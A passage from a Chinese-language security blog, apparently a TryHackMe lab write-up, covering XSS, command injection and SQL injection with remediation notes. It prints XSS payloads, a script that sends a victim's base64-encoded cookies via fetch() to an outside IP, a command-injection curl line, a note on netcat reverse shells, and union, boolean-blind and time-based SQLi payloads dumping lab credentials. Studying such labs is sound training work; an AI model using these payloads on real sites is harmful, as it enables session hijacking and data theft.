+<p>这里用单引号和分号闭合上一条命令，然后插入我们的恶意命令，然后用<code>//</code>注释后边的内容。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fb37c514.png" alt="image-20240413151340837.png"></p>
+<h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3>
+<p>好像是<code>ban</code>了<code>&lt;script&gt;</code>标签，这里用<code>&lt;img&gt;</code>标签绕过，当然需要<code>&lt;/h2&gt;</code>闭合一下。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/h2&gt;&lt;img src=x onerror=alert(&#x27;THM&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/images/cat.jpg&quot; onload=&quot;alert(&#x27;THM&#x27;);</span><br></pre></td></tr></table></figure>
+<h2 id="Practical-Example-Blind-XSS"><a href="#Practical-Example-Blind-XSS" class="headerlink" title="Practical Example (Blind XSS)"></a>Practical Example (Blind XSS)</h2>
+<p>看一下这个地方的例子。</p>
+<p>首先，我们注册账户，登录之后在<code>Support Tickets</code>这里可以发布一些内容，然后会被网站存储，那么我们考虑是不是存在存储<code>xss</code>。</p>
+<p>预期解：</p>
+<p>我们发布一个内容，点击查看之后，查看源代码。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fb242700.png" alt="image-20240413153050706.png"></p>
+<p>发现我们的内容被写入到<code>&lt;textarea&gt;</code>这里。</p>
+<p>那么我们可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>造成<code>XSS</code></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fb12a510.png" alt="image-20240413153200812.png"></p>
+<p>我们点击刚才编写的恶意内容，就会触发<code>xss</code></p>
+<p>非预期：</p>
+<p>这里发现除了这个文件内容可以触发<code>xss</code>，其实这个文章内容的标题也可以触发<code>xss</code>，而且这个是<code>0 click</code>的<code>xss</code>按说利用价值更高。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fb07e606.png" alt="image-20240413153332087.png"></p>
+<p>我们发现这里，我们写入的标签被包含在了<code>&lt;td&gt;</code>标签内。</p>
+<p>我们尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/td&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>触发<code>xss</code></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6faf605ba.png" alt="image-20240413153435726.png"></p>
+<p>我们可以看到直接被触发。</p>
+<p>下一步看一下盗取<code>cookie</code></p>
+<p>payload</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;http://10.13.55.152:1234?cookie=&#x27;</span> + <span class="title function_">btoa</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>) );</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fc4b015e.png" alt="image-20240413154102176.png"></p>
+<p>卧槽，打进去等了好久，以为是有机器人自动模拟点击，没想到还需要我自己点，自己插自己？</p>
+<p>再试一下，我们非预期的那个地方。</p>
+<p>payload</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;http://10.13.55.152:1234?cookie=&#x27;</span> + <span class="title function_">btoa</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>) );</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>emm，可以拿到，但是这个<code>cookie</code>是不对的。</p>
+<h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1>
+<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2>
+<p>命令注入是指滥用应用程序的行为在操作系统上执行命令，使用与设备上运行应用程序相同的权限。例如，在以名为<code>joe</code>的用户身份运行的<code>web</code>服务器上实现命令注入将在该<code>joe</code>用户下执行命令，从而获得<code>joe</code>拥有的任何权限。</p>
+<p>命令注入通常也称为“远程代码执行”（RCE），因为它能够在应用程序中远程执行代码。这些漏洞对攻击者来说往往是最有利可图的，因为这意味着攻击者可以直接与易受攻击的系统进行交互。例如，攻击者可以读取系统或用户文件、数据以及诸如此类的内容。</p>
+<p>例如，能够滥用应用程序来执行命令<code>whoami</code>以列出应用程序正在运行的用户帐户将是命令注入的一个示例。</p>
+<h2 id="Discovering-Command-Injection"><a href="#Discovering-Command-Injection" class="headerlink" title="Discovering Command Injection"></a>Discovering Command Injection</h2>
+<p>这种命令注入的漏洞存在是因为，<code>PHP</code>、<code>Python</code>、<code>NodeJS</code>等语言开发的应用程序，需要传递数据或者在自己机器的操作系统上执行系统调用。例如，从字段中获取输入并搜索文件中的条目。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fce4221f.png" alt="image-20240413192027954.png"></p>
+<p>这个代码就是一个命令注入漏洞的例子。</p>
+<p>这个代码接受一个<code>$title</code>然后拼接到<code>$command</code>当中用<code>grep</code>在<code>songtitle.txt</code>中匹配这个变量，判断是否存在。</p>
+<p>攻击者可以通过注入自己的命令让应用程序执行来滥用此应用程序。他们可以要求应用程序从更敏感的文件中读取数据，而不是使用grep在<code>songtitle.txt</code>中搜索条目。</p>
+<p>无论应用程序使用何种编程语言，以这种方式滥用应用程序都是可能的。只要应用程序处理并执行它，就会导致命令注入。例如，下面的代码片段是一个用<code>Python</code>编写的应用程序。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fcd31767.png" alt="image-20240413192547363.png"></p>
+<ol>
+<li>“flask”包用于设置web服务器</li>
+<li>使用<code>subproccess</code>包在设备上执行命令的函数</li>
+<li>我们在Web服务器中使用一个路由，该路由将执行所提供的任何内容。例如，要执行<code>whoami</code>，我们需要访问<code>http://flaskapp.thm/whoami</code></li>
+</ol>
+<h2 id="Exploiting-Command-Injection"><a href="#Exploiting-Command-Injection" class="headerlink" title="Exploiting Command Injection"></a>Exploiting Command Injection</h2>
+<p>我们可以用管道操作符<code>;</code>,<code>&amp;</code>,<code>|</code>,<code>&amp;&amp;</code>,<code>||</code>来连接两个或者更多的命令，实现命令联合执行。</p>
+<p>命令执行主要通过以下两种方式检查：</p>
+<ol>
+<li>盲指令注入</li>
+<li>详细命令注入</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th><strong>Method</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Blind</td>
+<td>This type of injection is where there is no direct output from the  application when testing payloads. You will have to investigate the  behaviours of the application to determine whether or not your payload  was successful.</td>
+</tr>
+<tr>
+<td>Verbose</td>
+<td>This type of  injection is where there is direct feedback from the application once  you have tested a payload. For example, running the <code>whoami</code> command to see what user the application is running under. The web application will output the username on the page directly.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="Detecting-Blind-Command-Injection"><a href="#Detecting-Blind-Command-Injection" class="headerlink" title="Detecting Blind Command Injection"></a>Detecting Blind Command Injection</h3>
+<p>盲指令注入是指发生指令注入时；但是，没有可见的输出，因此不会立即引起注意。例如，执行了一个命令，但web应用程序不输出任何消息。</p>
+<p>对于这种类型的命令注入，我们需要使用会导致一些时间延迟的<code>poc</code>。例如，<code>ping</code>和<code>sleep</code>命令是测试的重要有效载荷。以<code>ping</code>为例，应用程序将根据您指定的<code>ping</code>次数挂起<code>x</code>秒。</p>
+<p>检测盲命令注入的另一种方法是强制输出。这可以通过使用重定向运算符（如<code>&gt;</code>）来完成。例如，我们可以告诉web应用程序执行诸如<code>whoami</code>之类的命令，并将其重定向到文件。然后，我们可以使用诸如<code>cat</code>之类的命令来读取这个新创建的文件的内容。</p>
+<p>以这种方式测试命令注入通常很复杂，并且需要大量的实验，因为<code>Linux</code>和<code>Windows</code>之间的命令语法各不相同。
+<code>curl</code>命令是测试命令注入的好方法。这是因为您可以使用<code>curl</code>向负载中的应用程序传递数据，也可以从负载中的一个应用程序中传递数据。以下面的代码片段为例，可以为应用程序提供一个简单的<code>curl</code>有效负载来进行命令注入。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami</span><br></pre></td></tr></table></figure>
+<h3 id="Detecting-Verbose-Command-Injection"><a href="#Detecting-Verbose-Command-Injection" class="headerlink" title="Detecting Verbose Command Injection"></a>Detecting Verbose Command Injection</h3>
+<p>以这种方式检测命令注入可以说是这两种方法中最简单的方法。详细命令注入是指应用程序向您提供有关正在发生或正在执行的内容的反馈或输出。</p>
+<p>例如，<code>ping</code>或<code>whoami</code>等命令的输出直接显示在web应用程序上。</p>
+<p>Linux</p>
+<table>
+<thead>
+<tr>
+<th><strong>Payload</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>whoami</td>
+<td>See what user the application is running under.</td>
+</tr>
+<tr>
+<td>ls</td>
+<td>List the contents of the current directory. You may be able to find files  such as configuration files, environment files (tokens and application  keys), and many more valuable things.</td>
+</tr>
+<tr>
+<td>ping</td>
+<td>This command will invoke the application to hang. This will be useful in testing an application for blind command injection.</td>
+</tr>
+<tr>
+<td>sleep</td>
+<td>This is another useful payload in testing an application for blind command injection, where the machine does not have <code>ping</code> installed.</td>
+</tr>
+<tr>
+<td>nc</td>
+<td>Netcat can be used to spawn a reverse shell onto the vulnerable application.  You can use this foothold to navigate around the target machine for  other services, files, or potential means of escalating privileges.</td>
+</tr>
+</tbody>
+</table>
+<p>Windows</p>
+<table>
+<thead>
+<tr>
+<th><strong>Payload</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>whoami</td>
+<td>See what user the application is running under.</td>
+</tr>
+<tr>
+<td>dir</td>
+<td>List the contents of the current directory. You may be able to find files  such as configuration files, environment files (tokens and application  keys), and many more valuable things.</td>
+</tr>
+<tr>
+<td>ping</td>
+<td>This command will invoke the application to hang. This will be useful in testing an application for blind command injection.</td>
+</tr>
+<tr>
+<td>timeout</td>
+<td>This command will also invoke the application to hang. It is also useful for testing an application for blind command injection if the <code>ping</code> command is not installed.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="Remediating-Command-Injection"><a href="#Remediating-Command-Injection" class="headerlink" title="Remediating Command Injection"></a>Remediating Command Injection</h2>
+<p>可以通过多种方式防止命令注入。从在编程语言中尽量减少使用潜在危险的函数或库，到在不依赖用户输入的情况下过滤输入，无所不包。我在下面更详细地介绍了这些。下面的例子是PHP编程语言；然而，同样的原则可以扩展到许多其他语言。</p>
+<p>在<code>PHP</code>语言当中能执行系统命令的危险函数主要包括：</p>
+<ul>
+<li>Exec</li>
+<li>Passthru</li>
+<li>System</li>
+</ul>
+<p>以下面的代码片段为例，在此处，web应用程序将只接受和处理输入到表单中的数字，这意味着不会处理任何输入的命令，例如 whoami</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fc081e68.png" alt="image-20240413195130663.png"></p>
+<ol>
+<li>该web应用程序将只接受特定的字符格式（数字 0-9）</li>
+<li>然后该web应用程序将继续执行这个全是数字的数据。</li>
+</ol>
+<p>在默认情况下，类似的函数会接受字符串内容或者用户的数据输入，并将执行 在目标系统上被提供的任何内容，因此任何未经适当检查而使用这些函数的web应用程序都容易受到命令注入攻击的影响。</p>
+<h3><strong>sanitisation</strong></h3>
+<p>清理web应用程序所使用的用户输入是防止命令注入的好方法。 这是指定用户可以提交的数据格式或类型的过程。 例如，可以指定仅接受数字数据或删除任何特殊字符（如 <code>&gt;</code>、<code>&amp;</code> 和<code>/</code>）的输入字段。</p>
+<p>在下面的代码片段中，PHP 函数<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.filter-input.php">filter_input</a>用于检查通过输入表单提交的任何数据是否为数字，如果不是数字，则视为无效输入。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fbf8ab37.png" alt="image-20240413195232544.png"></p>
+<h3 id="Bypassing-Filters"><a href="#Bypassing-Filters" class="headerlink" title="Bypassing Filters"></a>Bypassing Filters</h3>
+<p>web应用程序可以采用多种技术来过滤和清理从用户输入中获取的数据，这些过滤器将限制你使用特定的有效载荷； 但是，我们可以滥用web应用程序背后的逻辑来绕过这些过滤器。</p>
+<p>例如，web应用程序可能会去掉我们所使用的payload中的引号，我们此时可以尝试改用引号的十六进制值来替代payload中的引号；虽然最终使用的payload数据格式与预期的不同，但仍然可以得到该payload成功执行的对应结果。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fbe76d73.png" alt="image-20240413195255401.png"></p>
+<h2 id="Practical-Command-Injection-Deploy"><a href="#Practical-Command-Injection-Deploy" class="headerlink" title="Practical: Command Injection (Deploy)"></a>Practical: Command Injection (Deploy)</h2>
+<p>太简单了，不写了。。。</p>
+<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1>
+<p>SQL（结构化查询语言）注入，通常被称为<code>SQLi</code>，是一种对web应用程序数据库服务器的攻击，导致恶意查询被执行。当web应用程序使用未经正确验证的用户输入与数据库通信时，攻击者可能会窃取、删除或更改私人和客户数据，并将web应用程序身份验证方法攻击到私人或客户区域。这就是为什么<code>SQLi</code>是最古老的web应用程序漏洞之一，它也可能是最具破坏性的。</p>
+<h2 id="In-Band-SQLi"><a href="#In-Band-SQLi" class="headerlink" title="In-Band SQLi"></a>In-Band SQLi</h2>
+<h3 id="In-Band-SQLi-1"><a href="#In-Band-SQLi-1" class="headerlink" title="In-Band SQLi"></a>In-Band SQLi</h3>
+<p>带回显的SQL 注入是最容易检测和利用的类型;带回显仅指用于利用漏洞并接收结果的相同通信方法，例如，在网站页面上发现 SQL 注入漏洞，然后能够将数据从数据库提取到同一页面。</p>
+<h3><strong>Error-Based SQL Injection</strong></h3>
+<p>这种类型的 SQL 注入对于轻松获取有关数据库结构的信息最有用，因为来自数据库的错误消息直接打印到浏览器屏幕。这通常可用于枚举整个数据库。</p>
+<h3><strong>Union-Based SQL Injection</strong></h3>
+<p>这种类型的注入利用 SQL UNION 运算符和 SELECT 语句将其他结果返回到页面。此方法是通过 SQL 注入漏洞提取大量数据的最常见方法。</p>
+<h3 id="In-Band-SQLi-2"><a href="#In-Band-SQLi-2" class="headerlink" title="In-Band SQLi"></a>In-Band SQLi</h3>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">https:<span class="operator">/</span><span class="operator">/</span>website.thm<span class="operator">/</span>article?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span>#</span><br><span class="line"></span><br><span class="line">#sqli_one</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>website.thm<span class="operator">/</span>article?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli_one&#x27;</span>#</span><br><span class="line">#article,staff_users</span><br><span class="line"></span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>website.thm<span class="operator">/</span>article?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;staff_users&#x27;</span>#</span><br><span class="line">#id,password,username</span><br><span class="line"></span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>website.thm<span class="operator">/</span>article?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(id,<span class="string">&#x27;:&#x27;</span>,username,<span class="string">&#x27;:&#x27;</span>,password),<span class="number">3</span> <span class="keyword">from</span> staff_users#</span><br><span class="line">#<span class="number">1</span>:admin:p4ssword,<span class="number">2</span>:martin:pa$$word,<span class="number">3</span>:jim:work123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#THM&#123;SQL_INJECTION_3840&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Blind-SQLi"><a href="#Blind-SQLi" class="headerlink" title="Blind SQLi"></a>Blind SQLi</h3>
+<p>与带回显 SQL 注入不同，我们可以直接在屏幕上看到攻击的结果，盲 SQLi 是指我们几乎没有得到任何反馈来确认注入的查询是否确实成功，这是因为错误消息已被禁用，但注入仍然有效。您可能会感到惊讶，我们只需要一点点反馈即可成功枚举整个数据库。</p>
+<h3><strong>Authentication Bypass</strong></h3>
+<p>最直接的 Blind SQL 注入技术之一是绕过身份验证方法（如登录表单）。在这种情况下，我们对从数据库中检索数据不感兴趣;我们只想通过登录。</p>
+<p>万能密码</p>
+<h3 id="Blind-SQLi-Boolean-Based"><a href="#Blind-SQLi-Boolean-Based" class="headerlink" title="Blind SQLi-Boolean Based"></a>Blind SQLi-Boolean Based</h3>
+<p>基于布尔值的 SQL 注入是指我们从注入尝试中收到的响应，可以是真/假、是/否、开/关、1/0 或任何只能有两个结果的响应。该结果证实了我们的 SQL 注入有效负载是否成功。在第一次检查时，您可能会觉得这种有限的响应无法提供太多信息。不过，仅通过这两个响应，就可以枚举整个数据库结构和内容。</p>
+<p>这个地方没法上脚本，真得需要自己手工盲注，差评。。。。。</p>
+<p>这里只好仔细复习一下，手工盲注的过程。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#判断数据库长度</span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>website.thm<span class="operator">/</span>checkuser?username<span class="operator">=</span>admin<span class="string">&#x27; and length(database())=10 --+</span></span><br><span class="line"><span class="string">#经过二分多次查找，发现数据库长度是10</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#判断数据库名</span></span><br><span class="line"><span class="string">https://website.thm/checkuser?username=admin&#x27;</span> <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>website.thm<span class="operator">/</span>checkuser?username<span class="operator">=</span>admin<span class="string">&#x27; and substr(database(),2,1)=&#x27;</span>q<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://website.thm/checkuser?username=admin&#x27;</span> <span class="keyword">and</span> substr(database(),<span class="number">3</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;l&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>website.thm<span class="operator">/</span>checkuser?username<span class="operator">=</span>admin<span class="string">&#x27; and substr(database(),10,1)=&#x27;</span>e<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">#sqli_three</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#数据库各个表的长度</span></span><br><span class="line"><span class="string">https://website.thm/checkuser?username=admin&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli_three&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">5</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">#表名</span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>website.thm<span class="operator">/</span>checkuser?username<span class="operator">=</span>admin<span class="string">&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;</span>sqli_three<span class="string">&#x27; limit 0,1),1,1)=&#x27;</span>u<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://website.thm/checkuser?username=admin&#x27;</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli_three&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>website.thm<span class="operator">/</span>checkuser?username<span class="operator">=</span>admin<span class="string">&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;</span>sqli_three<span class="string">&#x27; limit 0,1),5,1)=&#x27;</span>s<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">#users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#列名</span></span><br><span class="line"><span class="string">https://website.thm/checkuser?username=admin&#x27;</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;i&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>website.thm<span class="operator">/</span>checkuser?username<span class="operator">=</span>admin<span class="string">&#x27; and substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),2,1)=&#x27;</span>d<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://website.thm/checkuser?username=admin&#x27;</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),<span class="number">3</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;,&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>website.thm<span class="operator">/</span>checkuser?username<span class="operator">=</span>admin<span class="string">&#x27; and substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),4,1)=&#x27;</span>p<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://website.thm/checkuser?username=admin&#x27;</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),<span class="number">5</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">#id,password,username</span><br><span class="line"></span><br><span class="line">#直接查密码吧 太麻烦了。。。</span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>website.thm<span class="operator">/</span>checkuser?username<span class="operator">=</span>admin<span class="string">&#x27; and substr((select group_concat(password) from users where username=&#x27;</span>admin<span class="string">&#x27;),1,1)=&#x27;</span><span class="number">3</span><span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://website.thm/checkuser?username=admin&#x27;</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> group_concat(password) <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;8&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">#<span class="number">3845</span></span><br></pre></td></tr></table></figure>
+<h3 id="Blind-SQLi-Time-Based"><a href="#Blind-SQLi-Time-Based" class="headerlink" title="Blind SQLi - Time Based"></a>Blind SQLi - Time Based</h3>
+<p>基于布尔值的 SQL 注入是指我们从注入尝试中收到的响应，可以是真/假、是/否、开/关、1/0 或任何只能有两个结果的响应。该结果证实了我们的 SQL 注入有效负载是否成功。在第一次检查时，您可能会觉得这种有限的响应无法提供太多信息。不过，仅通过这两个响应，就可以枚举整个数据库结构和内容。</p>
+<p>这里不知道为什么那个<code>if</code>的<code>poc</code>不行</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">https://website.thm/analytics?referrer=admin123<span class="string">&#x27; UNION SELECT SLEEP(0.3),2 where database() like &#x27;</span>sqli_four%<span class="string">&#x27;;--</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">#sqli_four</span></span><br><span class="line"><span class="string">admin123&#x27;</span> UNION SELECT SLEEP(<span class="number">5</span>),<span class="number">2</span> <span class="keyword">from</span> users where username like <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password like <span class="string">&#x27;4961&#x27;</span>;--</span><br></pre></td></tr></table></figure>
+<h3 id="Out-of-Band-SQLi"><a href="#Out-of-Band-SQLi" class="headerlink" title="Out-of-Band SQLi"></a>Out-of-Band SQLi</h3>
+<p>带外(Out-of-Band) SQL 注入并不常见，因为它取决于数据库服务器上启用的特定功能或 Web 应用程序的业务逻辑，带外SQL注入攻击能根据 SQL 查询的结果进行某种外部网络调用。</p>
+<p>带外SQL注入攻击可分为两种不同的通信渠道，其中一种将用于发起注入攻击，另一种则用于收集攻击结果。 例如，攻击渠道可能是通过 Web 请求，而数据收集渠道可能是通过监控 针对你所控制的服务器而发出的 HTTP/DNS 请求。</p>
+<ol>
+<li>攻击者使用SQL注入payload向存在SQLi漏洞的目标网站发出 Web 请求。</li>
+<li>目标网站对数据库进行 SQL 查询操作，相关的查询语句会加载攻击者所使用的payload。</li>
+<li>攻击者所使用的payload中另外还包含了一个请求，该请求会强制将 包含来自目标服务器数据库的数据的HTTP请求 返回到攻击机上。</li>
+</ol>
+<h3 id="Remediation-1"><a href="#Remediation-1" class="headerlink" title="Remediation"></a>Remediation</h3>
+<p><strong>漏洞修复</strong></p>
+<p>由于SQL 注入漏洞的影响力，开发人员可以通过遵循下面的一些建议来保护他们的 Web 应用程序免受侵害。</p>
+<p><strong>预编译语句（使用参数化查询）：</strong></p>
+<p>在预编译查询中，开发人员首先编写的是 SQL 查询语句，然后再将任何用户输入都添加为查询语句中的参数。 编写预编译语句可以确保 SQL 代码结构不发生变化，并且数据库也可以更好地区分查询和数据，使用预编译语句还将让你的代码看起来更简洁且更易于阅读。</p>
+<p><strong>对外部输入进行验证：</strong></p>
+<p>输入验证处理可以大大保护输入到 SQL 查询语句中的内容。 通过建立允许列表(白名单)可以将输入限制为仅允许某些字符串，或者通过使用编程语言中的字符串替换方法来过滤一些你允许的字符或不允许的字符。</p>
+<p><strong>转义用户输入：</strong></p>
+<p>允许用户输入包含诸如 <code>' " $ \</code> 之类的特殊字符可能会导致 SQL 查询中断，或者更糟糕的是 攻击者可通过输入这些字符以进行SQL注入攻击；转义用户输入的方法是在这些特殊字符前面加上反斜杠 (<code>\</code>) 字符，然后就能将这些字符作为常规字符串处理而不是作为特殊字符进行解析。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">cl1mb3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/04/12/application/">http://example.com/2024/04/12/application/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">cl1mb3r的小站</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/test1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/04/11/%5BTHM%5D%20Intro%20to%20Cyber%20Security/" title="[THM] Intro to Cyber Security"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">[THM] Intro to Cyber Security</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/test1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">cl1mb3r</div><div class="author-info__description">果壳网安小菜狗</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div 